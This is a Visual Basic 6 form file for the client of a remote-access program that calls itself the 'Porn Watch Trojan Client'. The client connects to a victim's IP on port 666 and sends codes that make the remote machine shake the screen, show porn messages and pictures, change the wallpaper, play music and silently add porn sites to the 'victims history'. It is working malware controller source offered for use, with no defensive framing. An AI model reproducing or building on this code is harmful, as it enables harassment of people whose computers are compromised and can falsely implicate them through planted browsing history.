VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Porn Watch Trojan Client"
   ClientHeight    =   975
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   4260
   Icon            =   "client.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   975
   ScaleWidth      =   4260
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command10 
      Caption         =   "Close"
      Height          =   195
      Left            =   345
      TabIndex        =   10
      Top             =   720
      Width           =   3540
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Music"
      Height          =   330
      Left            =   2985
      TabIndex        =   9
      Top             =   390
      Width           =   900
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Set W'ppr"
      Height          =   345
      Left            =   2985
      TabIndex        =   8
      Top             =   45
      Width           =   900
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Porn Msg"
      Height          =   330
      Left            =   2100
      TabIndex        =   7
      Top             =   390
      Width           =   885
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Hid Sites"
      Height          =   345
      Left            =   2100
      TabIndex        =   6
      Top             =   45
      Width           =   885
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Veiw Site"
      Height          =   330
      Left            =   1230
      TabIndex        =   5
      Top             =   390
      Width           =   870
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Show Pic"
      Height          =   345
      Left            =   1230
      TabIndex        =   4
      Top             =   45
      Width           =   870
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Show Info"
      Height          =   330
      Left            =   345
      TabIndex        =   3
      Top             =   390
      Width           =   885
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Shake"
      Height          =   345
      Left            =   345
      TabIndex        =   2
      Top             =   45
      Width           =   885
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   2595
      Top             =   795
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connect"
      Height          =   360
      Left            =   3135
      TabIndex        =   1
      Top             =   330
      Width           =   870
   End
   Begin VB.TextBox Text1 
      Height          =   330
      Left            =   180
      TabIndex        =   0
      Top             =   345
      Width           =   2910
   End
   Begin VB.OLE info 
      Class           =   "Package"
      Height          =   225
      Left            =   825
      OleObjectBlob   =   "client.frx":0602
      SourceDoc       =   "C:\My Documents\Info.txt"
      TabIndex        =   11
      Top             =   3195
      Width           =   15
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
' Make the winsock control connect to specified I.P on the port that is listning
Winsock1.Connect Text1.Text, 666
' Hide the connect button and text box as they are now un-needed
Command1.Visible = False
Text1.Visible = False
'show all buttons that let us preform actions
Command2.Visible = True
Command3.Visible = True
Command4.Visible = True
Command5.Visible = True
Command6.Visible = True
Command7.Visible = True
Command8.Visible = True
Command9.Visible = True
Command10.Visible = True
End Sub

Private Sub Command10_Click()
' set error handling
On Error GoTo joe:
'send data to tell the server we have logged off
Winsock1.SendData "009"
' error handlng and rest of exit command
joe:
' msg goodbye
MsgBox "Goodbye!", vbExclamation, "Goodbye!"
'show some info
info.DoVerb
End
End Sub

Private Sub Command2_Click()
'send info corresopnding to the shake code on our server
Winsock1.SendData "001"
End Sub

Private Sub Command3_Click()
'send info corresopnding to the show info code on our server
Winsock1.SendData "002"
End Sub

Private Sub Command4_Click()
'send info corresopnding to the show pic code on our server
Winsock1.SendData "003"
End Sub

Private Sub Command5_Click()
'send info corresopnding to the veiw site code on our server
Winsock1.SendData "005"
End Sub

Private Sub Command6_Click()
'send info corresopnding to the hidden sites code on our server
Winsock1.SendData "006"
'msgbox about length of time ect...
MsgBox "It will take about 30 secs to add all sites to victims history ill roughly count them for u!", vbInformation, "Porn Watch Trojan!"
'use the wait command in the module to give a time guide to user
wait 30
'Another msbox saying complete!
MsgBox "All sites are roughly added to victims history depending on connection rate!", vbInformation, "Porn Watch Trojan!"
End Sub

Private Sub Command7_Click()
'send info corresopnding to the Porn Msg Loop code on our server
Winsock1.SendData "007"
End Sub

Private Sub Command8_Click()
'send info corresopnding to the Set Wallpaper code on our server
Winsock1.SendData "008"
End Sub

Private Sub Command9_Click()
'send info corresopnding to the play music code on our server
Winsock1.SendData "004"
End Sub

Private Sub Form_Load()
' Hide all un-needed controls to make it look more prfesional and to avoid errors
Command2.Visible = False
Command3.Visible = False
Command4.Visible = False
Command5.Visible = False
Command6.Visible = False
Command7.Visible = False
Command8.Visible = False
Command9.Visible = False
Command10.Visible = False
End Sub

Private Sub Form_Unload(Cancel As Integer)
' set error handling
On Error GoTo joe:
'send data to tell the server we have logged off
Winsock1.SendData "009"
' error handlng and rest of exit command
joe:
' msg goodbye
MsgBox "Goodbye!", vbExclamation, "Goodbye!"
'show some info
info.DoVerb
End
End Sub
